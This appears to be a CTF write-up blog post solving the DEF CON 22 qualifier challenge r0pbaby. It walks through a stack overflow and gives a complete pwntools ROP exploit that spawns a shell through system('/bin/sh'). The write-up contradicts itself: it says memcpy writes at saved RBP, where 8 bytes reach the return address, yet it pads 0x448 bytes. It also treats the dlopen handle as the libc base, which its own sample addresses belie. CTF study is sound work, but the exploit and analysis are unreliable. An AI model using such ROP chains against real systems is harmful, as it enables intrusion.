---
title: 'DEF CON 22 CTF Qualifier: r0pbaby'
date: 2014-05-16T00:00:00.000Z
excerpt: >-
  Solving DEF CON 22 CTF Qualifier's r0pbaby: leaking the shared library base,
  finding gadgets via PLT/GOT, and building a 64-bit ROP chain to call
  system().
tags:
  - ctf
  - writeup
  - pwn
  - defcon
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## checksec

```bash
[*] '/mnt/c/Users/user/Desktop/pwnable/pwn/baby/r0pbaby/r0pbaby'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

PIE is enabled, but there's no stack canary. NX is enabled, so we can't run shellcode directly on the stack - we need a ROP chain. Fortunately, the binary provides menu options that expose the libc base address and the address of arbitrary libc symbols.

## Running the program

```bash
➜  r0pbaby ./r0pbaby

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007F12580B2500
----------------------------------------
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2
Enter symbol: system
Symbol system: 0x00007F1257F0F410
----------------------------------------
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 4
Exiting.
```

The program opens `libc.so.6` with `dlopen` and exposes three primitives:

- **Option 1** - prints the handle returned by `dlopen`, which is the libc base address.
- **Option 2** - calls `dlsym` with a user-supplied symbol name and prints the resolved address.
- **Option 3** - reads up to 1024 bytes into `nptr`, then `memcpy`s it directly onto the stack.

## Source analysis

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int num; // eax
  void *v4; // rax
  unsigned __int64 num_2; // r14
  int idx; // er13
  uint64_t length; // r12
  int data; // eax
  void *handle; // [rsp+8h] [rbp-448h]
  char nptr[1088]; // [rsp+10h] [rbp-440h] BYREF
  __int64 savedregs; // [rsp+450h] [rbp+0h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, handler);
  alarm(0x3Cu);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
    ...
    if ( num != 3 )
      break;
    __printf_chk(1LL, "Enter bytes to send (max 1024): ");
    char_copy_B9A(nptr, 1024LL);
    num_2 = (int)strtol(nptr, 0LL, 10);
    if ( num_2 - 1 > 0x3FF )
    {
      puts("Invalid amount.");
    }
    else
    {
      ...
LABEL_22:
      memcpy(&savedregs, nptr, length);  // overflow happens here
    }
  }
  ...
}
```

The core vulnerability is in option 3. After reading a byte count from the user, it reads that many bytes into `nptr[1088]` and calls:

```c
memcpy(&savedregs, nptr, length);
```

`savedregs` sits at `[rbp+0]`, right above the saved RBP on the stack. The `nptr` buffer starts at `[rbp-0x440]` (1088 bytes below the saved RBP). So writing 8 bytes or more past the start of `savedregs` overwrites the return address.

The binary is stripped, so we can't find the exact offset via `nm` or debugger symbol lookup:

```bash
➜  r0pbaby nm r0pbaby
nm: r0pbaby: no symbols
```

We compute the offset empirically: since `nptr` is at `[rbp-0x440]` and `savedregs` is at `[rbp+0]`, the distance from `nptr` to the saved return address is `0x440 + 8 = 0x448` (1096) bytes.

## Exploit strategy

Since there's no stack canary and no ASLR protection against our own payload (we supply exact addresses directly), the plan is:

1. Use option 1 to leak the libc base.
2. Use option 2 to leak the `system` address and find a `pop rdi ; ret` gadget in libc.
3. Use option 3 to write the ROP chain: `[padding] [pop rdi ; ret] ["/bin/sh" address] [system address]`

### Finding the gadget

We need `pop rdi ; ret` to set up the first argument to `system`. Since PIE is enabled and the binary is stripped, we search libc directly:

```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop  = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

At runtime the gadget address is `libc_base + pop_rdi_offset`.

## Exploit

```python
from pwn import *

p = process('./r0pbaby')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def menu(choice):
    p.recvuntil(': ')
    p.sendline(str(choice))

def get_libc_base():
    menu(1)
    p.recvuntil('libc.so.6: ')
    return int(p.recvline().strip(), 16)

def get_symbol(sym):
    menu(2)
    p.recvuntil('Enter symbol: ')
    p.sendline(sym)
    p.recvuntil('Symbol %s: ' % sym)
    return int(p.recvline().strip(), 16)

def send_rop(payload):
    menu(3)
    p.recvuntil('Enter bytes to send (max 1024): ')
    p.sendline(str(len(payload)))
    p.send(payload)

libc_base  = get_libc_base()
system     = get_symbol('system')
bin_sh     = libc_base + next(libc.search(b'/bin/sh'))

rop_libc   = ROP(libc)
pop_rdi    = libc_base + rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = libc_base + rop_libc.find_gadget(['ret'])[0]

# offset from nptr to saved RIP: 0x440 (nptr size) + 8 (saved RBP)
padding = b'A' * (0x440 + 8)

payload  = padding
payload += p64(ret_gadget)   # stack alignment for system()
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

send_rop(payload)

p.interactive()
```

### Stack layout at `memcpy` time

```
[rsp]           → nptr[0]          ← start of the data we control
...
[rbp-0x440]    → nptr[0]
[rbp+0x00]     → saved RBP       ← overwritten with 'AAAA....'
[rbp+0x08]     → saved RIP       ← overwritten with the ret gadget
[rbp+0x10]     ← pop rdi ; ret
[rbp+0x18]     ← /bin/sh address
[rbp+0x20]     ← system()
```

## Summary

r0pbaby is a simple introduction to 64-bit ROP. Since the binary deliberately provides libc base leak and symbol resolution features, the actual task boils down to just the stack write primitive and gadget chaining. Key points:

- A `dlopen` handle == the shared library's load address, usable directly as the base.
- `dlsym` resolves symbols at runtime, giving exact function addresses without an ASLR bruteforce.
- In the 64-bit calling convention, the first argument goes in `rdi`; `pop rdi ; ret` is the standard way to set it up.
- A 16-byte stack alignment is required before calling `system` - misalignment causes glibc's `movaps` instruction to crash.
